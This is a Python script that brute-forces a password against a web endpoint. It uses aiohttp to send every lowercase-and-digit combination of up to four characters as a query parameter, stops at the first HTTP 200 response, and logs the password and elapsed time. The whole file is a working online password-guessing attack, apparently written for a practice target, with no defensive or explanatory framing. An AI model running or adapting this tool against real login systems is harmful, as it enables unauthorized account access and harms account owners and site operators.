import asyncio
import itertools
import string
import aiohttp
import time
from logger import logger
from env import get_url

async def try_password(session,url,password):
    params = {'password': password}
    try:
        async with session.get(url, params=params) as response:
            return response.status, await response.text()
    except asyncio.TimeoutError:
        logger.debug(f"time out for password {password}")
        return None, None

def password_generator(characters,min_length,max_length):
    for length in range(min_length,max_length+1):
        for password in itertools.product(characters,repeat=length):
            yield ''.join(password)
             
async def brute_force_password(session,url,characters,min_length,max_length):
    passwords = password_generator(characters,min_length,max_length)

    for password in passwords:
        status, text = await try_password(session,url,password)
        if status == 200:
            logger.critical(f"password found: {password}")
            logger.critical(f"response: {text}")
            return password
        elif text:
            logger.debug(f"password {password} failed")


async def main():
    url = get_url()
    characters = string.ascii_lowercase + string.digits
    min_length = 1
    max_length = 4
    start_time = time.time()
    async with aiohttp.ClientSession() as session:
        password = await brute_force_password(session,url,characters=characters,min_length=min_length,max_length=max_length)
        if password:
            time_elapsed = time.time() - start_time
            logger.critical(f"Time taken to find the password: {time_elapsed:.2f} seconds")
        else:
            logger.critical("Password not found")
    
if __name__ == '__main__':
    asyncio.run(main())